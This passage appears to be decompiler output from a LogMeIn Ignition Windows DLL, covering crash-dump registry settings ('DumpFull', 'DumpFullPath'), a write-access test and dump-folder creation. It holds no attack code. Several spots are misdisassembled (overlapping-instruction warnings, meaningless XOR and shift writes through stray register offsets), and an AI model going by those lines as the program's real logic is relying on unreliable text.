       (cVar3 = FUN_1001d1f0(&param_3,iVar9 + 0x10), param_3 = (int *)iVar9, cVar3 != '\0')) {
      param_3 = (int *)local_3c;
    }
    iVar9 = (int)param_3;
    if (piVar8 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar8;
      *piVar8 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar8);
      }
    }
    if (local_3c == iVar9) {
      param_3 = (int *)FUN_10058463(0x40,&DAT_10098020);
      local_8._0_1_ = 5;
      if (param_3 == (int *)0x0) {
        local_24 = 0;
      }
      else {
        uVar5 = FUN_1003abd0();
        local_24 = FUN_1003c970(uVar5);
      }
      local_8._0_1_ = 4;
      if (local_24 == 0) {
        param_4 = (int *)0x0;
      }
      else {
        FUN_1003ade0();
        FUN_1003aff0();
        if ((((local_24 != 0) && (iVar9 = FUN_1003cb30(local_24,&DAT_10088e54), iVar9 != 0)) &&
            (iVar9 = FUN_1003cb30(extraout_ECX_00,&DAT_10088e54), iVar9 != 0)) &&
           (iVar9 = FUN_1003cb30(extraout_ECX_01,L"Software"), iVar9 != 0)) {
          pwVar15 = L"LogMeIn Ignition";
          pwVar12 = L"Software";
          uVar5 = extraout_ECX_02;
          uVar14 = extraout_ECX_02;
          FUN_1003cb30(extraout_ECX_02,&DAT_10088e54);
          FUN_1003cb30(uVar5,pwVar12);
          iVar9 = FUN_1003cb10(uVar14,pwVar15);
          if (iVar9 != 0) {
            pwVar16 = L"Settings";
            pwVar15 = L"LogMeIn Ignition";
            pwVar12 = L"Software";
            uVar5 = extraout_ECX_03;
            uVar14 = extraout_ECX_03;
            uVar13 = extraout_ECX_03;
            FUN_1003cb30(extraout_ECX_03,&DAT_10088e54);
            FUN_1003cb30(uVar5,pwVar12);
            FUN_1003cb30(uVar14,pwVar15);
            iVar9 = FUN_1003cb10(uVar13,pwVar16);
            if (iVar9 != 0) {
              pwVar16 = L"Settings";
              pwVar15 = L"LogMeIn Ignition";
              pwVar12 = L"Software";
              uVar5 = extraout_ECX_04;
              uVar14 = extraout_ECX_04;
              uVar13 = extraout_ECX_04;
              FUN_1003cb30(extraout_ECX_04,&DAT_10088e54);
              FUN_1003cb30(uVar5,pwVar12);
              FUN_1003cb30(uVar14,pwVar15);
              FUN_1003cb30(uVar13,pwVar16);
              iVar9 = FUN_1003cb10(extraout_ECX_05,L"DumpFull");
              if (iVar9 == 0) {
                FUN_1003cd30(L"dword",extraout_ECX_06,L"DumpFull");
                puVar11 = (undefined4 *)FUN_1003cce0();
                uVar5 = FUN_10039c20(0,extraout_ECX_07);
                *puVar11 = uVar5;
              }
              else {
                uVar5 = extraout_ECX_06;
                FUN_1003cb30(extraout_ECX_06,L"DumpFull");
                uVar14 = 0x1001f59c;
                FUN_1003cce0();
                param_4 = (int *)FUN_10039b90(uVar5,uVar14);
              }
            }
          }
        }
        param_3 = (int *)FUN_1000bd10();
        local_8._0_1_ = 6;
        piVar8 = (int *)FUN_1001d0f0(&param_3);
        *piVar8 = (int)param_4;
        if (param_3 != (int *)0x0) {
          LOCK();
          iVar9 = *param_3;
          *param_3 = iVar9 + -1;
          UNLOCK();
          if (iVar9 + -1 < 0) {
            FUN_100579ee(param_3);
          }
        }
      }
    }
    else {
      param_4 = *(int **)(iVar9 + 0x14);
    }
  }
  else {
    param_4 = (int *)FUN_1001c390(L"DumpFull",0,0,0);
  }
  param_3 = (int *)0x0;
  local_8._0_1_ = 7;
  if (local_28 != 2) {
    FUN_1001c6f0(L"DumpFullPath",&param_3,0,0);
    goto LAB_1001f632;
  }
  piVar8 = (int *)FUN_1000bd10();
  local_18 = piVar8;
  piVar10 = (int *)FUN_1001d340(&local_18);
  if ((piVar10 == local_34) ||
     (cVar3 = FUN_1001d1f0(&local_18,piVar10 + 4), local_18 = piVar10, cVar3 != '\0')) {
    local_18 = local_34;
  }
  piVar10 = local_18;
  if (piVar8 != (int *)0x0) {
    LOCK();
    iVar9 = *piVar8;
    *piVar8 = iVar9 + -1;
    UNLOCK();
    if (iVar9 + -1 < 0) {
      FUN_100579ee(piVar8);
    }
  }
  if (local_34 != piVar10) {
    param_3 = (int *)FUN_10010440(piVar10[5]);
    goto LAB_1001f632;
  }
  if (local_24 == 0) {
    local_18 = (int *)FUN_10058463(0x40,&DAT_10098020);
    local_8._0_1_ = 8;
    if (local_18 == (int *)0x0) {
      local_24 = 0;
    }
    else {
      uVar5 = FUN_1003abd0();
      local_24 = FUN_1003c970(uVar5);
    }
    local_8._0_1_ = 7;
    uVar2 = (undefined1)local_8;
    local_8._0_1_ = 7;
    if (local_24 != 0) {
      local_8._0_1_ = uVar2;
      FUN_1003ade0();
      FUN_1003aff0();
      if (local_24 != 0) goto LAB_1001f784;
      goto LAB_1001f8bf;
    }
    FUN_1000ad00(L"DumpFullPath",0xffffffff);
    local_8._0_1_ = 9;
    puVar11 = (undefined4 *)FUN_1001d190(&local_18);
    uVar5 = FUN_10010440(0);
    *puVar11 = uVar5;
  }
  else {
LAB_1001f784:
    iVar9 = FUN_1003cb30(local_24,&DAT_10088e54);
    if (((iVar9 != 0) && (iVar9 = FUN_1003cb30(extraout_ECX_08,&DAT_10088e54), iVar9 != 0)) &&
       (iVar9 = FUN_1003cb30(extraout_ECX_09,L"Software"), iVar9 != 0)) {
      pwVar15 = L"LogMeIn Ignition";
      pwVar12 = L"Software";
      uVar5 = extraout_ECX_10;
      uVar14 = extraout_ECX_10;
      FUN_1003cb30(extraout_ECX_10,&DAT_10088e54);
      FUN_1003cb30(uVar5,pwVar12);
      iVar9 = FUN_1003cb10(uVar14,pwVar15);
      if (iVar9 != 0) {
        pwVar16 = L"Settings";
        pwVar15 = L"LogMeIn Ignition";
        pwVar12 = L"Software";
        uVar5 = extraout_ECX_11;
        uVar14 = extraout_ECX_11;
        uVar13 = extraout_ECX_11;
        FUN_1003cb30(extraout_ECX_11,&DAT_10088e54);
        FUN_1003cb30(uVar5,pwVar12);
        FUN_1003cb30(uVar14,pwVar15);
        iVar9 = FUN_1003cb10(uVar13,pwVar16);
        if (iVar9 != 0) {
          pwVar16 = L"Settings";
          pwVar15 = L"LogMeIn Ignition";
          pwVar12 = L"Software";
          uVar5 = extraout_ECX_12;
          uVar14 = extraout_ECX_12;
          uVar13 = extraout_ECX_12;
          FUN_1003cb30(extraout_ECX_12,&DAT_10088e54);
          FUN_1003cb30(uVar5,pwVar12);
          FUN_1003cb30(uVar14,pwVar15);
          FUN_1003cb30(uVar13,pwVar16);
          iVar9 = FUN_1003cb10(extraout_ECX_13,L"DumpFullPath");
          if (iVar9 == 0) {
            FUN_1003cd30(L"string",extraout_ECX_14,L"DumpFullPath");
            puVar11 = (undefined4 *)FUN_1003cce0();
            uVar5 = FUN_10010440(0);
            *puVar11 = uVar5;
          }
          else {
            FUN_1003cb30(extraout_ECX_14,L"DumpFullPath");
            puVar11 = (undefined4 *)FUN_1003cce0();
            param_3 = (int *)FUN_10010440(*puVar11);
          }
        }
      }
    }
LAB_1001f8bf:
    local_18 = (int *)FUN_1000bd10();
    local_8._0_1_ = 10;
    puVar11 = (undefined4 *)FUN_1001d190(&local_18);
    uVar5 = FUN_10010440(param_3);
    *puVar11 = uVar5;
  }
  local_8._0_1_ = 7;
  if (local_18 != (int *)0x0) {
    local_8._0_1_ = 7;
    LOCK();
    iVar9 = *local_18;
    *local_18 = iVar9 + -1;
    UNLOCK();
    if (iVar9 + -1 < 0) {
      FUN_100579ee(local_18);
    }
  }
LAB_1001f632:
  iVar9 = FUN_1001fc30();
  puVar11 = local_14;
  if (iVar9 == 0) {
    if (param_4 != (int *)0x0) {
      FUN_1001faf0(0x23,0);
      FUN_1001faf0(0x1c,1);
    }
  }
  else {
    FUN_1001fdb0(&param_3);
  }
  FUN_1001f140();
  if (param_3 != (int *)0x0) {
    LOCK();
    iVar9 = *param_3;
    *param_3 = iVar9 + -1;
    UNLOCK();
    if (iVar9 + -1 < 0) {
      FUN_100579ee(param_3);
    }
  }
  if (local_24 != 0) {
    FUN_1003a1b0(local_24);
  }
  FUN_1001cff0();
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar9 = *piVar6;
    *piVar6 = *piVar6 + -1;
    UNLOCK();
    if (iVar9 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  ExceptionList = local_10;
  return puVar11;
}



/* Function: FUN_1001f9a0 */

void __thiscall FUN_1001f9a0(int *param_1,int param_2)

{
  byte *pbVar1;
  int iVar2;
  uint uVar3;
  int *piVar4;
  undefined **ppuVar5;
  int *piVar6;
  byte extraout_CL;
  int unaff_EBX;
  byte bVar7;
  undefined1 local_60 [4];
  undefined1 *local_5c;
  undefined1 local_54 [20];
  char local_40 [4];
  char acStack_3c [4];
  char acStack_38 [4];
  char acStack_34 [4];
  char local_30 [4];
  char acStack_2c [4];
  char acStack_28 [4];
  char acStack_24 [4];
  char local_20 [4];
  char local_1c [2];
  char local_1a;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075648;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  piVar4 = *(int **)(*param_1 + param_2 * 4);
  if (piVar4 != (int *)0x0) {
    LOCK();
    *piVar4 = *piVar4 + 1;
    UNLOCK();
  }
  local_8 = 0;
  local_18 = uVar3;
  piVar4 = (int *)FUN_1000bfa0(L"\\WriteAccessTest.txt",0xffffffff);
  FUN_1002e2e0(1,4,0);
  if ((piVar4 == (int *)0x0) || (ppuVar5 = (undefined **)(piVar4 + 3), piVar4[2] == 0)) {
    ppuVar5 = &PTR_10083554;
  }
  FUN_102739ef(ppuVar5,0xc0000000,1,local_60,2,0x8000080,0,uVar3);
  pbVar1 = (byte *)(unaff_EBX + -0x47c28);
  bVar7 = 0;
  *pbVar1 = *pbVar1 ^ extraout_CL;
  if (*pbVar1 != 0) {
    local_20[0] = s_something_to_be_written_into_the_10084c1c[0x20];
    local_20[1] = s_something_to_be_written_into_the_10084c1c[0x21];
    local_20[2] = s_something_to_be_written_into_the_10084c1c[0x22];
    local_20[3] = s_something_to_be_written_into_the_10084c1c[0x23];
    local_1c[0] = s_something_to_be_written_into_the_10084c1c[0x24];
    local_1c[1] = s_something_to_be_written_into_the_10084c1c[0x25];
    local_1a = s_something_to_be_written_into_the_10084c1c[0x26];
    local_40[0] = s_something_to_be_written_into_the_10084c1c[0];
    local_40[1] = s_something_to_be_written_into_the_10084c1c[1];
    local_40[2] = s_something_to_be_written_into_the_10084c1c[2];
    local_40[3] = s_something_to_be_written_into_the_10084c1c[3];
    acStack_3c[0] = s_something_to_be_written_into_the_10084c1c[4];
    acStack_3c[1] = s_something_to_be_written_into_the_10084c1c[5];
    acStack_3c[2] = s_something_to_be_written_into_the_10084c1c[6];
    acStack_3c[3] = s_something_to_be_written_into_the_10084c1c[7];
    acStack_38[0] = s_something_to_be_written_into_the_10084c1c[8];
    acStack_38[1] = s_something_to_be_written_into_the_10084c1c[9];
    acStack_38[2] = s_something_to_be_written_into_the_10084c1c[10];
    acStack_38[3] = s_something_to_be_written_into_the_10084c1c[0xb];
    acStack_34[0] = s_something_to_be_written_into_the_10084c1c[0xc];
    acStack_34[1] = s_something_to_be_written_into_the_10084c1c[0xd];
    acStack_34[2] = s_something_to_be_written_into_the_10084c1c[0xe];
    acStack_34[3] = s_something_to_be_written_into_the_10084c1c[0xf];
    local_30[0] = s_something_to_be_written_into_the_10084c1c[0x10];
    local_30[1] = s_something_to_be_written_into_the_10084c1c[0x11];
    local_30[2] = s_something_to_be_written_into_the_10084c1c[0x12];
    local_30[3] = s_something_to_be_written_into_the_10084c1c[0x13];
    acStack_2c[0] = s_something_to_be_written_into_the_10084c1c[0x14];
    acStack_2c[1] = s_something_to_be_written_into_the_10084c1c[0x15];
    acStack_2c[2] = s_something_to_be_written_into_the_10084c1c[0x16];
    acStack_2c[3] = s_something_to_be_written_into_the_10084c1c[0x17];
    acStack_28[0] = s_something_to_be_written_into_the_10084c1c[0x18];
    acStack_28[1] = s_something_to_be_written_into_the_10084c1c[0x19];
    acStack_28[2] = s_something_to_be_written_into_the_10084c1c[0x1a];
    acStack_28[3] = s_something_to_be_written_into_the_10084c1c[0x1b];
    acStack_24[0] = s_something_to_be_written_into_the_10084c1c[0x1c];
    acStack_24[1] = s_something_to_be_written_into_the_10084c1c[0x1d];
    acStack_24[2] = s_something_to_be_written_into_the_10084c1c[0x1e];
    acStack_24[3] = s_something_to_be_written_into_the_10084c1c[0x1f];
    FUN_105b2e4f();
    *(uint *)(unaff_EBX + -1) = *(uint *)(unaff_EBX + -1) << 1 | (uint)bVar7;
    if (piVar4 == (int *)0x0) {
      piVar6 = (int *)0x0;
    }
    else {
      piVar6 = piVar4 + 3;
    }
    FUN_1005a7b5(piVar6);
  }
  if ((local_54 != local_5c) && (local_5c != (undefined1 *)0x0)) {
    (*DAT_10079288)(local_5c);
  }
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar4;
    *piVar4 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1001faf0 */

void __thiscall FUN_1001faf0(int *param_1,uint param_2,int param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  int extraout_ECX;
  int *local_220;
  undefined2 local_21c [260];
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_1007567b;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_220 = (int *)0x0;
  local_8 = 0;
  local_14 = uVar3;
  FUN_1001fdb0(&local_220);
  local_8 = 0xffffffff;
  if (local_220 != (int *)0x0) {
    LOCK();
    iVar1 = *local_220;
    *local_220 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_220,uVar3);
    }
  }
  local_21c[0] = 0;
  uVar4 = FUN_10396a22(0,param_2 | 0x8000,0,0,local_21c);
  if (-1 < extraout_ECX) {
    iVar1 = *param_1;
    param_3 = param_3 * 4;
    uVar4 = FUN_1000bdd0(local_21c,uVar4);
    *(undefined4 *)(iVar1 + param_3) = uVar4;
    FUN_1001fc30();
    iVar1 = param_1[3];
    iVar2 = *param_1;
    if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
      uVar4 = FUN_1000bfa0(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
      *(undefined4 *)(iVar2 + param_3) = uVar4;
    }
    FUN_1001fc30();
    iVar1 = param_1[4];
    iVar2 = *param_1;
    if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
      uVar4 = FUN_1000bfa0(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
      *(undefined4 *)(iVar2 + param_3) = uVar4;
    }
    FUN_1001fc30();
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1001fc30 */

/* WARNING: Removing unreachable block (ram,0x1001fd69) */
/* WARNING: Removing unreachable block (ram,0x1001fd6d) */
/* WARNING: Removing unreachable block (ram,0x1001fd73) */
/* WARNING: Removing unreachable block (ram,0x1001fd7f) */

void __fastcall FUN_1001fc30(uint *param_1,int param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  char extraout_CL;
  char cVar4;
  int *local_38;
  undefined1 local_34 [4];
  undefined1 *local_30;
  undefined1 local_28 [20];
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100756b8;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  uVar1 = *param_1;
  if ((uVar1 != 0) && (*(int *)(uVar1 + 8) != 0)) {
    if ((uVar1 != 0) && (*(int *)(uVar1 + 8) != 0)) {
      if (uVar1 == 0) {
        iVar2 = 0;
      }
      else {
        iVar2 = uVar1 + 0xc;
      }
      cVar4 = 0xfffffff3 < uVar1;
      FUN_105d7326(iVar2,local_14);
      *(char *)(param_2 + -0x17c10) = (*(char *)(param_2 + -0x17c10) - extraout_CL) - cVar4;
    }
    FUN_1002e2e0(0,4,0);
    local_8 = 0;
    if (*param_1 == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = *param_1 + 0xc;
    }
    FUN_1022af53(iVar2,local_34);
    piVar3 = (int *)FUN_1000ae10(&local_38);
    if (*piVar3 == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = *piVar3 + 0xc;
    }
    FUN_10006250("folder creation failed: \'%s\'\n",iVar2);
    if (local_38 != (int *)0x0) {
      LOCK();
      iVar2 = *local_38;
      *local_38 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(local_38);
      }
    }
    if ((local_28 != local_30) && (local_30 != (undefined1 *)0x0)) {
      (*DAT_10079288)(local_30);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1001fdb0 */

undefined4 * __thiscall FUN_1001fdb0(undefined4 *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int *piVar3;
  
  puVar1 = (undefined4 *)param_1[1];
  puVar2 = param_1;
  if ((param_2 < puVar1) && (puVar2 = (undefined4 *)*param_1, puVar2 <= param_2)) {
    if (puVar1 == (undefined4 *)param_1[2]) {
      puVar1 = (undefined4 *)FUN_1001fea0(puVar2);
    }
    if ((undefined4 *)param_1[1] == (undefined4 *)0x0) goto LAB_1001fe0e;
    puVar1 = (undefined4 *)*param_1;
    piVar3 = (int *)puVar1[(int)param_2 - (int)puVar2 >> 2];
    *(undefined4 *)param_1[1] = piVar3;
  }
  else {
    if (puVar1 == (undefined4 *)param_1[2]) {
      FUN_1001fea0(puVar2);
    }
    puVar1 = (undefined4 *)param_1[1];
    if (puVar1 == (undefined4 *)0x0) goto LAB_1001fe0e;
    piVar3 = (int *)*param_2;
    *puVar1 = piVar3;
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    puVar1 = (undefined4 *)*piVar3;
    *piVar3 = *piVar3 + 1;
    UNLOCK();
  }
LAB_1001fe0e:
  param_1[1] = param_1[1] + 4;
  return puVar1;
}



/* Function: FUN_1001fe20 */

void __thiscall FUN_1001fe20(int param_1,undefined4 *param_2,undefined4 *param_3)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int *piVar4;
  undefined4 uVar5;
  undefined4 *puVar6;
  
  puVar2 = *(undefined4 **)(param_1 + 4);
  puVar3 = param_3;
  for (puVar6 = param_3 + 1; puVar6 != puVar2; puVar6 = puVar6 + 1) {
    uVar5 = FUN_10010440(*puVar6);
    *puVar3 = uVar5;
    puVar3 = puVar3 + 1;
  }
  puVar3 = *(undefined4 **)(param_1 + 4);
  for (puVar6 = puVar3 + -1; puVar6 != puVar3; puVar6 = puVar6 + 1) {
    piVar4 = (int *)*puVar6;
    if (piVar4 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar4;
      *piVar4 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar4);
      }
    }
  }
  *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + -4;
  *param_2 = param_3;
  return;
}



/* Function: FUN_1001fea0 */

void __fastcall FUN_1001fea0(int *param_1)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1[2] - param_1[1] >> 2 == 0) {
    iVar3 = param_1[1] - *param_1 >> 2;
    if (iVar3 == 0x3fffffff) {
      FUN_10056a6a("vector<T> too long");
      pcVar1 = (code *)swi(3);
      (*pcVar1)();
      return;
    }
    uVar4 = iVar3 + 1;
    uVar2 = param_1[2] - *param_1 >> 2;
    if (0x3fffffff - (uVar2 >> 1) < uVar2) {
      uVar2 = 0;
      if (uVar4 != 0) {
        uVar2 = uVar4;
      }
      FUN_1001ff10(uVar2);
      return;
    }
    uVar2 = uVar2 + (uVar2 >> 1);
    if (uVar2 < uVar4) {
      uVar2 = uVar4;
    }
    FUN_1001ff10(uVar2);
  }
  return;
}



/* Function: FUN_1001ff10 */

void __thiscall FUN_1001ff10(int *param_1,uint param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  code *pcVar4;
  int iVar5;
  int iVar6;
  undefined4 *puVar7;
  
  iVar6 = 0;
  if ((param_2 != 0) && ((0x3fffffff < param_2 || (iVar6 = FUN_100582fa(param_2 << 2), iVar6 == 0)))
     ) {
    FUN_10056a39();
    pcVar4 = (code *)swi(3);
    (*pcVar4)();
    return;
  }
  FUN_1001ffc0(iVar6);
  puVar2 = (undefined4 *)param_1[1];
  puVar7 = (undefined4 *)*param_1;
  iVar5 = (int)puVar2 - (int)puVar7;
  if (puVar7 != (undefined4 *)0x0) {
    for (; puVar7 != puVar2; puVar7 = puVar7 + 1) {
      piVar3 = (int *)*puVar7;
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar3;
        *piVar3 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
    }
    thunk_FUN_100579ee(*param_1);
  }
  *param_1 = iVar6;
  param_1[2] = iVar6 + param_2 * 4;
  param_1[1] = iVar6 + (iVar5 >> 2) * 4;
  return;
}



/* Function: FUN_1001ffc0 */

void __fastcall FUN_1001ffc0(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3)

{
  int *piVar1;
  
  if (param_1 != param_2) {
    do {
      if (param_3 != (undefined4 *)0x0) {
        piVar1 = (int *)*param_1;
        *param_3 = piVar1;
        if (piVar1 != (int *)0x0) {
          LOCK();
          *piVar1 = *piVar1 + 1;
          UNLOCK();
        }
      }
      param_1 = param_1 + 1;
      param_3 = param_3 + 1;
    } while (param_1 != param_2);
  }
  return;
}



/* Function: FUN_10020000 */

int FUN_10020000(short *param_1,uint param_2)

{
  int iVar1;
  char cVar2;
  int *piVar3;
  undefined4 *puVar4;
  int *piVar5;
  int iVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int extraout_ECX_01;
  int *piVar7;
  int extraout_ECX_02;
  int extraout_ECX_03;
  undefined4 extraout_ECX_04;
  int extraout_ECX_05;
  int *piVar8;
  int local_40;
  int local_3c;
  int *local_34;
  int *local_30;
  int *local_28;
  int *local_24;
  int *local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075708;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_1000ba10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  local_14 = (int *)0x0;
  piVar8 = (int *)0x0;
  local_8 = 0;
  local_18 = (int *)0x0;
  if ((param_1 == (short *)0x0) || (*param_1 != 0)) {
    local_1c = (int *)FUN_1000bd10();
  }
  else {
    local_1c = (int *)FUN_1000ba60();
  }
  local_8._0_1_ = 2;
  FUN_1000c820(1);
  piVar5 = local_1c;
  if ((local_1c == (int *)0x0) || (local_1c[2] == 0)) {
    if (param_2 == 0) {
      FUN_1001f080(extraout_ECX,L"\\LogMeIn",L"\\Dumps",1);
      local_8._0_1_ = 4;
      param_2 = 0;
      piVar3 = (int *)0x0;
      if (local_3c - local_40 >> 2 != 0) {
        do {
          iVar6 = *(int *)(local_40 + param_2 * 4);
          if (iVar6 == 0) {
            iVar6 = 0;
          }
          else {
            iVar6 = iVar6 + 0xc;
          }
          piVar5 = (int *)FUN_1000bdd0(iVar6,local_40);
          local_14 = piVar5;
          if ((piVar5 != (int *)0x0) && (piVar5[2] != 0)) {
            cVar2 = FUN_1004ab70(piVar5[2],extraout_ECX_04);
            if ((cVar2 == '\0') && (*param_1 != 0x5c)) {
              piVar5 = (int *)FUN_1000bfa0(&DAT_1008401c,0xffffffff);
            }
            piVar8 = (int *)FUN_10010440(piVar5);
            local_18 = piVar8;
            local_14 = (int *)FUN_1000bfa0(param_1,0xffffffff);
            FUN_100203a0(&local_14,&local_18);
          }
          param_2 = param_2 + 1;
          piVar5 = local_1c;
          piVar3 = local_14;
        } while (param_2 < (uint)(local_3c - local_40 >> 2));
      }
      local_8._0_1_ = 2;
      if (local_30 != (int *)0x0) {
        LOCK();
        iVar6 = *local_30;
        *local_30 = iVar6 + -1;
        UNLOCK();
        if (iVar6 + -1 < 0) {
          FUN_100579ee(local_30);
        }
      }
      if (local_34 != (int *)0x0) {
        LOCK();
        iVar6 = *local_34;
        *local_34 = iVar6 + -1;
        UNLOCK();
        if (iVar6 + -1 < 0) {
          FUN_100579ee(local_34);
        }
      }
      FUN_1000b750();
      iVar6 = extraout_ECX_05;
    }
    else {
      piVar3 = (int *)FUN_1000bdd0(param_2,extraout_ECX);
      if (piVar3 == (int *)0x0) {
        iVar6 = 0;
        piVar7 = (int *)0x0;
      }
      else {
        iVar6 = piVar3[2];
        piVar7 = piVar3 + 3;
      }
      local_14 = piVar3;
      cVar2 = FUN_1004ab70(iVar6,piVar7);
      if ((cVar2 == '\0') && (*param_1 != 0x5c)) {
        piVar3 = (int *)FUN_1000bfa0(&DAT_1008401c,0xffffffff);
        local_14 = piVar3;
      }
      local_28 = (int *)0x0;
      local_8 = CONCAT31(local_8._1_3_,3);
      iVar6 = FUN_1000c520(&local_28);
      if (iVar6 == 0) {
        FUN_10021a40(0,0);
        piVar7 = local_24;
        if (local_24 != (int *)0x0) {
          LOCK();
          *local_24 = *local_24 + 1;
          UNLOCK();
        }
        FUN_1000c820(1);
        puVar4 = (undefined4 *)FUN_10019e10(&local_14);
        piVar8 = (int *)FUN_10010440(*puVar4);
        local_18 = piVar8;
        if (local_14 != (int *)0x0) {
          LOCK();
          iVar6 = *local_14;
          *local_14 = iVar6 + -1;
          UNLOCK();
          if (iVar6 + -1 < 0) {
            FUN_100579ee(local_14);
          }
        }
        if (piVar7 != (int *)0x0) {
          LOCK();
          iVar6 = *piVar7;
          *piVar7 = iVar6 + -1;
          UNLOCK();
          if (iVar6 + -1 < 0) {
            FUN_100579ee(piVar7);
          }
        }
        if (local_24 != (int *)0x0) {
          LOCK();
          iVar6 = *local_24;
          *local_24 = iVar6 + -1;
          UNLOCK();
          if (iVar6 + -1 < 0) {
            FUN_100579ee(local_24);
          }
        }
      }
      if ((piVar3 != (int *)0x0) && (piVar3[2] != 0)) {
        piVar8 = (int *)FUN_1000bfa0(piVar3 + 3,piVar3[2]);
        local_18 = piVar8;
      }
      FUN_10010440(piVar8);
      local_14 = (int *)FUN_1000bfa0(param_1,0xffffffff);
      FUN_100203a0(&local_14,&local_18);
      local_8._0_1_ = 2;
      iVar6 = extraout_ECX_02;
      piVar3 = local_14;
      if (local_28 != (int *)0x0) {
        LOCK();
        iVar1 = *local_28;
        iVar6 = *local_28;
        *local_28 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(local_28);
          iVar6 = extraout_ECX_03;
          piVar3 = local_14;
        }
      }
    }
  }
  else {
    piVar8 = (int *)FUN_1000bdd0(local_1c + 3,extraout_ECX);
    local_18 = piVar8;
    local_14 = (int *)FUN_1000bdd0(param_1,extraout_ECX_00);
    FUN_100203a0(&local_14,&local_18);
    iVar6 = extraout_ECX_01;
    piVar3 = local_14;
  }
  iVar6 = FUN_10020f30(iVar6);
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar5;
    iVar6 = *piVar5;
    *piVar5 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar6 = FUN_100579ee(piVar5);
    }
  }
  if (piVar8 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar8;
    iVar6 = *piVar8;
    *piVar8 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar6 = FUN_100579ee(piVar8);
    }
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar3;
    *piVar3 = *piVar3 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar6 = FUN_100579ee(piVar3);
    }
  }
  ExceptionList = local_10;
  return iVar6;
}



/* Function: FUN_100203a0 */

/* WARNING: Instruction at (ram,0x10020389) overlaps instruction at (ram,0x10020386)
    */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_100203a0(uint *param_1)

{
  ushort uVar1;
  int *piVar2;
  undefined2 uVar3;
  uint uVar4;
  int iVar5;
  int *piVar6;
  int *piVar7;
  int *piVar8;
  undefined4 uVar9;
  undefined **ppuVar10;
  int iVar11;
  ushort *puVar12;
  char extraout_DH;
  uint uVar13;
  int unaff_EBX;
  int unaff_ESI;
  int *unaff_EDI;
  bool bVar14;
  bool bVar15;
  char cVar16;
  char cVar17;
  undefined8 uVar18;
  undefined1 *puVar19;
  undefined1 local_264 [592];
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 uStack_8;
  
  uStack_8 = 0xffffffff;
  puStack_c = &LAB_10075746;
  local_10 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  uVar13 = *param_1;
  if (uVar13 == 0) {
    iVar5 = 0;
    cVar16 = false;
    bVar15 = true;
  }
  else {
    iVar5 = uVar13 + 0xc;
    cVar16 = iVar5 < 0;
    bVar15 = iVar5 == 0;
  }
  cVar17 = uVar13 != 0 && SCARRY4(uVar13,0xc);
  bVar14 = 0xfffffff3 < uVar13;
  puVar19 = local_264;
  local_14 = uVar4;
  uVar3 = FUN_105c1f45(iVar5);
